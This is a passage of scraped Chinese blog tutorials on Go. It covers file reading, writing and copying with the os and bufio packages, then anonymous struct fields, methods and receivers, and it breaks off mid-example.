第2种方式：func (file *File) WriteAt(b []byte, off int64) (n int, err Error)，从off位置开始写入byte。 第3种方式：func (file *File) WriteString(s string) (ret int, err Error)，写入string到文件。只能处理文本文件（非二进制文件），它只会往里面写字符串。\n5.2.4 读文件 第1种方式：func (file *File) Read(b []byte) (n int, err Error)，读取数据到byte切片中。 第2种方式：func (file *File) ReadAt(b []byte, off int64) (n int, err Error)，从off位置开始读取数据到byte切片中。\n5.2.5 删除文件 第1种方式：func Remove(name string) Error，删除文件名为name的文件。\n5.3 标准输出设备文件的使用 5.3.1 往标准输出设备写内容 标准输出设备通常指的是屏幕，Golang 默认是往屏幕写内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) func main() { fmt.Println(\u0026#34;hello world.\u0026#34;) os.Stdout.Close() //把输出设备给关了，关闭文件后，无法再输出 fmt.Println(\u0026#34;hello go.\u0026#34;) } /* 运行结果： hello world. Process finished with exit code 0 */ 还可以使用 os.Stdout.WriteString(s string) 往设备输出内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) func main() { os.Stdout.WriteString(\u0026#34;hello world.\\n\u0026#34;) //需手动换行 var words = []byte{\u0026#39;a\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;\\n\u0026#39;} os.Stdout.Write(words) fmt.Println(words) } /* 运行结果： hello world. ae\tio\tu [97 101 9 105 111 9 117 10] Process finished with exit code 0 */ 5.4 写文件的操作 5.4.1 WriteString()的使用 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) func WriteFile(path string) { //1.打开文件（新建文件） f, err := os.Create(path) if err != nil { fmt.Println(\u0026#34;create file failed. err:\u0026#34;, err) return //有错误就结束函数，不让它往下走了 } //使用完毕，必须关闭文件 defer f.Close() //函数调用完毕，即表示文件使用完毕了 //2.往里面写内容 var s string for i := 0; i \u0026lt; 10; i++ { s = fmt.Sprintf(\u0026#34;这是第%d行！\\n\u0026#34;, i) n, err := f.WriteString(s) if err != nil { fmt.Printf(\u0026#34;write %d line err:%+v\\n\u0026#34;, i, err) } else { fmt.Printf(\u0026#34;wrote %d words.\\n\u0026#34;, n) //以byte类型来计算长度 } } } func main() { path := \u0026#34;./demo.txt\u0026#34; WriteFile(path) } /* 运行结果： wrote 17 words. wrote 17 words. wrote 17 words. wrote 17 words. wrote 17 words. wrote 17 words. wrote 17 words. wrote 17 words. wrote 17 words. wrote 17 words. */ 5.5 读文件的操作 5.5.1 Read()的使用 直接使用已在5.4.1示例中生成的demo.txt。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;os\u0026#34; ) func ReadFile(path string) { //1.打开文件 f, err := os.Open(path) if err != nil { fmt.Println(\u0026#34;open file failed. err=\u0026#34;, err) return } //使用完毕，关闭文件 defer f.Close() //2.读取内容 buf := make([]byte, 2048) //Read([]byte)中的参数需要是一个byte类型的切片 n, err := f.Read(buf) //n表示实际一共读取了多少字节 //EOF:end of file，表示文件的正常结束。文件已经正常结束了，说明整个文件都读取完整了。 //既然整个文件都读取完整了，并且正常结束了，那么何来的错误？ //EOF是表示文件正常结束，而不是错误。所以需要再判断一下，错误并不是EOF if err != nil \u0026amp;\u0026amp; err != io.EOF { fmt.Println(\u0026#34;read content failed. err=\u0026#34;, err) return } fmt.Printf(\u0026#34;has read %d words.\\n\u0026#34;, n) fmt.Println(string(buf[:n])) //[:n]指定取多少个字节。如果说读取了很多字节，但实际上没有那么多字节。剩下的都会以空字符形式来表现，显示上不够友好 } func main() { path := \u0026#34;./demo.txt\u0026#34; ReadFile(path) } /* 运行结果： has read 170 words. 这是第0行！ 这是第1行！ 这是第2行！ 这是第3行！ 这是第4行！ 这是第5行！ 这是第6行！ 这是第7行！ 这是第8行！ 这是第9行！ */ 5.5.2 Read(b []byte)，[]byte的长度表示去读取多少个字节 上例中，声明切片时，长度指定了 2048 个字节。那么就表示，去文件中读取 2048 个字节。 下图这个反面教材中的指定了切片长度为 0，那么就表示，去文件中读取 0 个字节。\n1 buf := make([]byte, 0)\t//这个切片长度是为了给后面的Read()。指定多少长度，就去读取多少个字节。长度指定0，表示去读取0个字节！读取0个字节，就等于什么都不去读取。 指定了只读取 90 个字节，那么程序只会去读取 90 个字节，剩下的内容都不会去读取。\n指定去读取 999 个字节，但文件中只有 170 个字节。指定的读取数量超过了文件中的总内容，那么剩余的每一个字节就会以空字符来显示。\n5.5.3 根据文件总大小去读取内容 既然大了也不是，小了也不行。那么就先得到这个文件的总大小，然后指定这个总大小的数字去读取内容。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;os\u0026#34; ) func ReadFile(path string) { f, err := os.Open(path) if err != nil { fmt.Println(\u0026#34;open file failed. err=\u0026#34;, err) return } //尝试获取文件的大小 //f.Stat()返回一个接口，FileInfo类型中有一个Size()的方法可以获取到文件的总大小 fi, err := f.Stat() if err != nil \u0026amp;\u0026amp; err != io.EOF { fmt.Println(\u0026#34;get file stat failed. err=\u0026#34;, err) return } fsize := fi.Size() //获取到文件的总大小 fmt.Println(\u0026#34;this file size is :\u0026#34;, fsize) defer f.Close() //使用完毕，关闭文件 buf := make([]byte, fsize) //文件总大小有多少，那么就指定去读取多少 n, err := f.Read(buf) if err != nil \u0026amp;\u0026amp; err != io.EOF { fmt.Println(\u0026#34;read content failed. err=\u0026#34;, err) return } fmt.Printf(\u0026#34;has read %d bytes.\\n\u0026#34;, n) fmt.Println(string(buf)) //不用再写[:n]了，因为已经读取了跟文件总大小完全匹配的全部内容 } func main() { path := \u0026#34;./demo.txt\u0026#34; ReadFile(path) } /* 运行结果： this file size is : 170 has read 170 bytes. 这是第0行！ 这是第1行！ 这是第2行！ 这是第3行！ 这是第4行！ 这是第5行！ 这是第6行！ 这是第7行！ 这是第8行！ 这是第9行！ */ 注意：获取文件总大小并按这个长度去读取，属于一次性读取整个文件中的内容。小文本可以这么使用，但是大文本这么全部读取到内存中，会占用比较大的内存资源从而导致影响性能。 该解决方案从这里看来的：link\n5.5.4 os.Stat() 获取文件的元数据信息 上面的案例中，因为需要读取出文件中的内容。所以采用的策略是：先打开这个文件，有了这个文件指针后，通过这个指针变量去获取该文件的元数据信息。 如果只想要获取文件的元数据信息，而不打开文件，就可以使用 os.State() 方法。它可以在不打开文件的情况下，获取到文件的元数据信息。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) func main() { fi, err := os.Stat(\u0026#34;1.mp4\u0026#34;) if err != nil { panic(err) } fmt.Println(\u0026#34;file name:\u0026#34;, fi.Name()) fmt.Println(\u0026#34;file size:\u0026#34;, fi.Size()) fmt.Println(\u0026#34;is dir?\u0026#34;, fi.IsDir()) fmt.Println(\u0026#34;file mode:\u0026#34;, fi.Mode()) fmt.Println(\u0026#34;file modTime:\u0026#34;, fi.ModTime()) } /* 运行结果： file name: 1.mp4 file size: 8021539 is dir? false file mode: -rw-rw-rw- file modTime: 2020-09-13 18:14:06.889 +0800 CST */ 5.6 逐行读取内容 需要借助 Golang 内建包 bufio，它是带缓存的 I/O。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 import ( \u0026#34;bufio\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;os\u0026#34; ) func ReadFileByLine(path string) { f, err := os.Open(path) if err != nil { fmt.Println(\u0026#34;open file failed. err:\u0026#34;, err) return } defer f.Close() //新建一个缓冲区，把内容先放在缓冲区 r := bufio.NewReader(f) for { //遇到\u0026#39;\\n\u0026#39;结束读取，但\u0026#39;\\n\u0026#39;同时也被读取了 buf, err := r.ReadBytes(\u0026#39;\\n\u0026#39;) if err != nil { if err == io.EOF { //文件已正常结束 break } else { fmt.Println(\u0026#34;read bytes err:\u0026#34;, err) } } fmt.Printf(\u0026#34;buf = #%s#\u0026#34;, string(buf)) //井号前后都没有加过换行符，但是ReadBytes()会把指定的字符也给读取了 } } func main() { path := \u0026#34;./demo.txt\u0026#34; ReadFileByLine(path) } /* 运行结果： buf = #这是第0行！ #buf = #这是第1行！ #buf = #这是第2行！ #buf = #这是第3行！ #buf = #这是第4行！ #buf = #这是第5行！ #buf = #这是第6行！ #buf = #这是第7行！ #buf = #这是第8行！ #buf = #这是第9行！ # */ 5.7 文件案例：拷贝文件 Read() 读取，Write() 写入。 设计思路：使用命令行实现功能。\n5.7.1 参考代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;os\u0026#34; ) //获取命令行参数 func GetCMDArgs() []string { cmdArry := os.Args if len(cmdArry) != 3 { fmt.Println(\u0026#34;command line error. except: binaryName.exe srcFileName dstFileName\u0026#34;) os.Exit(-1) } return cmdArry } //获取文件名，分别是源文件名和目标文件名 func GetFilenames(cmdArry []string) (srcFileName, dstFileName string) { srcFileName = cmdArry[1] dstFileName = cmdArry[2] if srcFileName == dstFileName { fmt.Println(\u0026#34;The destination file name cannot be the same as the source file name.\u0026#34;) os.Exit(-1) } return } //核心功能，实现文件的拷贝 func ExecuteCopy(srcFileName, dstFileName string) { buf := make([]byte, 1024*5) //切片缓冲区，以多少个字节去读取文件中的内容。1024Byte = 1KB //打开源文件 srcF, err := os.Open(srcFileName) if err != nil { fmt.Println(\u0026#34;open source file failed. error:\u0026#34;, err) os.Exit(-1) } defer srcF.Close() //关闭文件 //创建目标文件 dstF, err := os.Create(dstFileName) if err != nil { fmt.Println(\u0026#34;create destination file failed. error:\u0026#34;, err) os.Exit(-1) } defer dstF.Close() //关闭文件 for { n, err := srcF.Read(buf) if err != nil { if err == io.EOF { //文件已到末尾，正常结束 break } } dstF.Write(buf[:n]) //buf[:n]表示读多少写多少，到了最后的时候，往往读不全指定的字节数据量。如果还是写死为buf，超出部分将会是空字节内容 } } func main() { cmdArry := GetCMDArgs() srcFileName, dstFileName := GetFilenames(cmdArry) ExecuteCopy(srcFileName, dstFileName) } 5.7.2 buf[:n]，表示读多少写多少 5.7.1 示例代码中，ExecuteCopy() 函数的倒数第二行代码：dstF.Write(buf[:n])。它表示读取到多少内容，就写入多少内容。 这个 buf 是可以自行指定，每次读取多少个字节。\n5.7.2.1 不采用读多少写多少模式所引发的问题 修改 for 循环中的代码，抛弃读多少写多少的模式，指定了每次就是一股脑地往目标文件中写入 1024*5 个字节：\n1 2 3 4 5 6 7 8 9 10 for { _, err := srcF.Read(buf) // [:n] 被抛弃了 if err != nil { if err == io.EOF { // 文件已到末尾，正常结束 break } } dstF.Write(buf) //每次写入5120个字节，不管实际是不是有那么多数据。数据不够会产生空字节 } 再次编译运行代码后，可以看到。如果不写 buf[:n]，那么最后就会有几个空字节多出来。 直观看起来，就是目标文件比源文件大出一点来.\n5.7.2.2 大致原理 源文件总大小是 17047119 个字节，每次读取 10245 个字节，需要 3329.5 次才能把整个文件读取完整。 那么前 3329 次是没有问题的，一共能够读取到 17044480 个字节。当最后一次读取数据的时候，只剩下 2639 个有效字节了，只能读取到这 2639 个有效字节。但是写入数据的时候，它是以 buf 指定的字节量去写入数据。buf 指定的是 10245 个字节去写入，但最后只读到了 2639 个字节，而你却要写入 5120 个字节。既然你诚心诚意想要写入 5120 个字节，那么 Golang 就满足你的意愿，它很忠诚地往目标文件中写入了 5120 个字节。指定要去写入 5120 个字节，但却只有 2639 个有效字节，那么剩余的 2481 个字节只能用空字节来占位。（5120 - 2639 = 2481） 目标文件总大小是 17049600 个字节，源文件大小是 17047119 个字节，（17049600 - 17047119 = 2481）目标文件比源文件多出了 2481 个字节。\n","date":"2021-01-09T15:45:33Z","image":"https://w.wallhaven.cc/full/gp/wallhaven-gpd95q.png","permalink":"https://360rce.github.io/p/xb9uhh7c/","title":"Golang学习之异常与文本文件处理"},{"content":"一、Golang面向对象编程概念 Golang没有沿袭其他传统编程语言面向对象的概念：没有封装、继承、多态这些概念，但可以通过别的方式来实现这些特性：\n封装：通过方法实现 继承：通过匿名字段实现 多态：通过接口实现 二、匿名字段 2.1 匿名字段的概念 一般情况下，定义结构体的时候是字段名与其类型一一对应，实际上Golang支持只提供类型而不写字段名的方式，这就是匿名字段。 匿名字段的简单体验： 当匿名字段也是一个结构体s1且存在于另一个结构体s2的时候，那么s1结构体的全部字段都会被隐式地引入到结构体s2。此时，匿名字段也可以被称为嵌入字段，实现了\u0026quot;继承\u0026quot;的思想。 例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //人 type Person struct { name string sex byte age int } //学生 type Student struct { Person //匿名字段，只有Person类型而没有名字，那么Student默认就包含了Person的所有字段 //学生额外的字段 stuNo int //学号 address string } Student中的Person，Person只是个类型而没有给它起名称，所以Person就是匿名字段！Student中的Person会把Person类型中的字段全部引用过来。\n2.2 匿名字段初始化 2.2.1 顺序初始化 对应结构体中的字段，一个个给值。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段，Student默认就包含了Person的所有字段 stuNo int //学号 address string } func main() { var s1 = Student{ Person: Person{\u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11}, //Person本身也是一个结构体，对结构体匿名字段进行初始化需要这样写 stuNo: 0, address: \u0026#34;Google Inc.\u0026#34;, } fmt.Println(\u0026#34;s1=\u0026#34;, s1) //s1= {{go 77 11} 0 Google Inc.} } 2.2.2 自动推导类型 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段，Student默认就包含了Person的所有字段 stuNo int //学号 address string } func main() { s1 := Student{Person{\u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 0, \u0026#34;Google Inc.\u0026#34;} fmt.Printf(\u0026#34;s1=%+v\\n\u0026#34;, s1) //s1={Person:{name:go sex:77 age:11} stuNo:0 address:Google Inc.} } %+v 信息显示地更加详细！从上例中可以看到，每个字段名也打印了出来。 注意：如果结构体中使用了另一个结构体，就必须显示地带上类型，不然就报错！ 例如：\n1 2 3 4 func main() { s2 := Student{{\u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 0, \u0026#34;\u0026#34;} //报错：missing type in composite literal ===\u0026gt; 组合字面量中缺少类型 fmt.Println(\u0026#34;s2=\u0026#34;, s2) } {\u0026quot;go\u0026quot;, 'M', 11} 前面一定要带上 Person 这个类型！ 匿名函数在Golang官方中的叫法是：函数字面量，这里再次看到了字面量这个词语，也可以得知匿名字段也只一个结构体的字面量。\n2.2.3 指定成员初始化 指定结构体匿名字段的话，就一层套一层地去写。例如：StructName:StructName{FieldName:Value}。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段，Student默认就包含了Person的所有字段 stuNo int //学号 address string } func main() { //一层套一层的写法，Person:Person{字段名:值} s1 := Student{Person: Person{name: \u0026#34;go\u0026#34;}, address: \u0026#34;Google Inc.\u0026#34;} fmt.Printf(\u0026#34;s1=%+v\\n\u0026#34;, s1) //s1={Person:{name:go sex:0 age:0} stuNo:0 address:Google Inc.} } 2.3 成员操作 跟操作普通结构体的方式一模一样。\n2.3.1 方式一 结构体字面量（结构体匿名字段）已经被直接引入了，可以用 . 来访问。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段，Student默认就包含了Person的所有字段 stuNo int //学号 address string } func main() { s1 := Student{Person{\u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 0, \u0026#34;\u0026#34;} fmt.Printf(\u0026#34;s1.name=%v\\n\u0026#34;, s1.name) //直接可以使用了 fmt.Printf(\u0026#34;s1.sex=%v\\n\u0026#34;, s1.sex) fmt.Printf(\u0026#34;s1.age=%v\\n\u0026#34;, s1.age) fmt.Printf(\u0026#34;s1.stuNo=%v\\n\u0026#34;, s1.stuNo) fmt.Printf(\u0026#34;s1.address=%v\\n\u0026#34;, s1.address) } /* s1.name=go s1.sex=77 s1.age=11 s1.stuNo=0 s1.address= */ 2.3.2 方式二 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段，Student默认就包含了Person的所有字段 stuNo int //学号 address string } func main() { s1 := Student{Person{\u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 0, \u0026#34;\u0026#34;} s1.name = \u0026#34;Golang\u0026#34; //修改成员的值，也是直接用点\u0026#34;.\u0026#34;来操作 s1.address = \u0026#34;Google Inc.\u0026#34; fmt.Printf(\u0026#34;s1=%+v\\n\u0026#34;, s1) //s1={Person:{name:Golang sex:77 age:11} stuNo:0 address:Google Inc.} } 2.3.3 方式三 结构体中的字面量当做一个整体赋值。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段，Student默认就包含了Person的所有字段 stuNo int //学号 address string } func main() { s1 := Student{Person{\u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 0, \u0026#34;\u0026#34;} //Person在Student中是一个结构体，可以被整体赋值 s1.Person = Person{name: \u0026#34;go-lang\u0026#34;} //注意等号\u0026#34;=\u0026#34;后面要带上类型，未给值的将把原来的值给覆盖使用其类型的零值 fmt.Printf(\u0026#34;s1=%+v\\n\u0026#34;, s1) //s1={Person:{name:go-lang sex:0 age:0} stuNo:0 address:} } 注意：当做一个整体赋值的时候，如果有字段没给值，那么就会使用其类型对应的零值覆盖原值。\n2.4 同名字段 实质上跟作用域的规则一样：能在当前作用域内找到的就用当前作用域内的字段，没有找到才往上去找。 例1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段，Student默认就包含了Person的所有字段 stuNo int //学号 address string name string //和Person中的name同名了 } func main() { var s Student s.name = \u0026#34;Golang\u0026#34; s.sex = \u0026#39;M\u0026#39; s.age = 11 fmt.Printf(\u0026#34;s=%+v\\n\u0026#34;, s) //s={Person:{name: sex:77 age:11} stuNo:0 address: name:Golang} } 可以看到Person中的name是空字符串，跟作用域的规则一样：s.name能在Student中找到，那么就用了Student中的name，不会去管Person中的name了；而Student中没有sex这个字段，那么程序就会往上去找，找到了Person中有sex字段，就给Person中的sex字段赋值了。 想要使用Person中的name，就需要显示调用。 例2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段，Student默认就包含了Person的所有字段 stuNo int //学号 address string name string //和Person中的name同名了 } func main() { var s Student s.name = \u0026#34;Golang\u0026#34; s.sex = \u0026#39;M\u0026#39; //Student中没有sex这个字段，会往上去找，找到Person中有sex字段 s.age = 11 s.Person.name = \u0026#34;01\u0026#34; //显示调用，指定为Person中的name s.Person.sex = \u0026#39;u\u0026#39; //指定调用，这里会覆盖之前的值 s.Person.age = 219 fmt.Printf(\u0026#34;s=%+v\\n\u0026#34;, s) //s={Person:{name:01 sex:117 age:219} stuNo:0 address: name:Golang} } 显示调用后，两个name都被指定了，就各管各的了。\n2.5 非结构体匿名字段 就是只写数据类型而不写变量名。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 type myAddress string //自定义类型，说白了就是给一个类型起个别名 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { Person //结构体匿名字段 int //普通类型的匿名字段 myAddress //使用自定义类型 } func main() { s := Student{Person{\u0026#34;Go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 101010, \u0026#34;Google Inc.\u0026#34;} fmt.Printf(\u0026#34;s=%+v\\n\u0026#34;, s) s.Person = Person{name: \u0026#34;C\u0026#34;, sex: \u0026#39;m\u0026#39;} //当做一个整体赋值 s.int = 999 //直接操作那个类型即可 s.myAddress = \u0026#34;贝尔实验室\u0026#34; //直接操作结构体里的字段即可 fmt.Printf(\u0026#34;s=%+v\\n\u0026#34;, s) } /* 运行结果： s={Person:{name:Go sex:77 age:11} int:101010 myAddress:Google Inc.} s={Person:{name:C sex:109 age:0} int:999 myAddress:贝尔实验室} */ Student 中的 int 字段就是非结构体（普通类型）匿名字段。\n2.6 结构体匿名字段的指针类型 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 type myAddress string //自定义类型，说白了就是给一个类型起个别名 //人 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //学生 type Student struct { *Person //结构体匿名字段的指针类型 int //普通类型的匿名字段 myAddress //使用自定义类型 } func main() { //第一种方式，使用取地址符\u0026#34;\u0026amp;\u0026#34; //Student中的Person是指针类型，这里的Person需要在前面加上取地址符\u0026#34;\u0026amp;\u0026#34; s := Student{\u0026amp;Person{\u0026#34;Go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 101010, \u0026#34;Google Inc.\u0026#34;} fmt.Printf(\u0026#34;s=%+v\\n\u0026#34;, s) //\u0026amp;Person是取内存地址，这样写只会打印出内存地址的值 //需要一个个写才能显示真正的内容 fmt.Println(s.Person.name, s.Person.sex, s.Person.age, s.int, s.myAddress) //Go 77 11 101010 Google Inc. //第二种方式，new() var s2 Student s2.Person = new(Person) //分配一个内存地址，让*Person变成一个指向Person的合法指针 //有合法指向后，即可操作里面的成员 s2.name = \u0026#34;C\u0026#34; s2.sex = \u0026#39;m\u0026#39; s2.age = 48 s2.int = 999 //s2.int不是指针，只是普通类型的匿名字段 s2.myAddress = \u0026#34;贝尔实验室\u0026#34; fmt.Println(s2.Person.name, s2.Person.sex, s2.Person.age, s2.int, s2.myAddress) } /* 运行结果： s={Person:0xc0000044a0 int:101010 myAddress:Google Inc.} Go 77 11 101010 Google Inc. C 109 48 999 贝尔实验室 */ 三、方法 在 Golang 中，方法本质上也是一个函数，它要和自定义类型绑定在一起。绑定了某一个类型的函数，被称为方法。带有接收者的函数叫方法，换言之：为某个类型绑定了一个函数，那个函数就被称为方法。 可以给任意自定义类型添加相应的方法（指针和接口类型除外）。 语法：func (receiver ReceiverType) funcName(params) (results)。 receiver：接收者的名称，可任意命名，符合变量命名规则即可。方法要跟自定义类型绑定在一起，被绑定的那个叫接收者。 ReceiverType：接收者的数据类型，可以是T或者*T，但它自身的基类型T不能是接口或指针。\n3.1 基本数据类型绑定方法 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //自定义一个类型 type long int //给long类型绑定一个Add函数，由tmp来接收，tmp就是接收者 //接收者就是传递过来的一个参数，other是调用时小括号里的另一个参数 func (tmp long) Add(other long) long { return tmp + other } func main() { var a long //定义一个变量a，类型是long a = 10 //long指向的是int类型，所以可以直接给int类型的值，其他类型是不可以的 //a是一个long类型，long类型绑定了一个Add函数，所以a可以调用long类型中的这个Add函数 //这里的a其实是一个接收者，传递过去一个参数即可 result := a.Add(20) //注意：Add返回的是一个long类型了 fmt.Printf(\u0026#34;result type is : %T, result=%v\\n\u0026#34;, result, result) //result type is : main.long, result=30 } result := a.Add(20) 这行代码中，a 是一个 long 类型的变量，对应地传递给了 long 类型的接收者，20 传递给方法中的形参：\n3.2 结构体类型绑定方法 3.2.1 示例：绑定一个方法，实现修改结构体成员值 注意：结构体是值传递，要修改结构体成员的值需要用到指针。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //带有接收者的函数被称为方法，使用类型来调用 //接收者本身就是一个参数 func (tmp Person) PrintInfo() { fmt.Println(\u0026#34;person infos =\u0026#34;, tmp) } //修改结构体的成员需要用到指针 func (p *Person) SetInfo(name string, sex byte, age int) { p.name = name (*p).sex = sex p.age = age } func main() { //自动推导 p := Person{\u0026#34;go\u0026#34;, \u0026#39;m\u0026#39;, 11} p.PrintInfo() //p本身就是一个参数，传递给tmp这个接收者 //接收者是一个指针类型，需要一个指向合法内存地址的指针 //new()方式 p1 := new(Person) p1.SetInfo(\u0026#34;C\u0026#34;, \u0026#39;M\u0026#39;, 48) p1.PrintInfo() //取地址符方式 var p2 Person (\u0026amp;p2).SetInfo(\u0026#34;Ada\u0026#34;, \u0026#39;F\u0026#39;, 40) p2.PrintInfo() //没有取地址符在这里也可以 } /* 运行结果： person infos = {go 109 11} person infos = {C 77 48} person infos = {Ada 70 40} */ 3.2.2 针对上面例子的反面教材 如果不传递结构体的内存地址，结构体将以值传递的方式进行传参，不同作用域内的结构体是各管各的。 修改3.2.1的代码成如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } func (tmp Person) PrintInfo() { fmt.Println(\u0026#34;person infos =\u0026#34;, tmp) } //修改结构体的成员需要用到指针 //未使用指针，接收的是一个拷贝过来的副本，在函数中的任何操作都只是在操作副本 func (p Person) SetInfo(name string, sex byte, age int) { p.name = name p.sex = sex p.age = age fmt.Println(\u0026#34;inner SetInfo():\u0026#34;, p) } func main() { p1 := Person{\u0026#34;go\u0026#34;, \u0026#39;m\u0026#39;, 11} fmt.Printf(\u0026#34;main(), before setting ... \u0026#34;) p1.PrintInfo() p1.SetInfo(\u0026#34;C\u0026#34;, \u0026#39;M\u0026#39;, 48) fmt.Printf(\u0026#34;main(), after setting ... \u0026#34;) p1.PrintInfo() } /* 运行结果： main(), before setting ... person infos = {go 109 11} inner SetInfo(): {C 77 48} main(), after setting ... person infos = {go 109 11} */ 结构体传参，默认是值传递：只是把一份副本拷贝过去。在SetInfo()函数中的所有操作都只是在操作这个副本，SetInfo()函数结束后，这个副本就被回收了。那么在main()中，是找不到这个副本的，所以依然会使用之前的。 在另外一个函数中想要修改结构体成员的值，必须传址！\n3.3 注意事项 3.3.1 ReceiverType接收者的基类型不能是指针 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 type long int //接收者不使用的话，可以省略不写 //没问题可以编译通过 func (long) Add(second int) { } // type bigInt *int //报错：invalid receiver type bigInt (bigInt is a pointer type) //非法的接收者类型（bigInt是一个指针类型） func (tmp bigInt) Add(second int) { } //这样是能编译通过的 //接收者接收一个内存地址，而long本身它是int类型，不是指针类型 func (tmp *long) SetValue(value int) { } func main() { } bigInt 是一个接收者类型，它本身是一个 int 指针，而** Golang 规定方法的接收者类型不允许为指针**！\n3.3.2 接收者类型不一样，就不同的方法 下例不会出现重复定义的错误：\n1 2 3 4 5 6 7 8 9 10 11 type char byte type long int32 func (c char) test() { } func (l long) test() { } func main() { } 3.4 值语义和引用语义 就是值传递与引用传递的区别，值传递称为值语义，引用传递称为引用语义。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } //值传递（值语义），传过来的是实参的一份副本 func (p Person) SetInfoValue(name string, sex byte, age int) { p.name = name p.sex = sex p.age = age fmt.Printf(\u0026#34;SetInfoValue(): p address:%p, p=%v\\n\u0026#34;, \u0026amp;p, p) //这里的接收者不是一个指针类型，所以取地址要加上取地址符\u0026#34;\u0026amp;\u0026#34; } //引用传递（引用语义），接收一个内存地址的实参 func (p *Person) SetInfoPointer(name string, sex byte, age int) { p.name = name p.sex = sex p.age = age 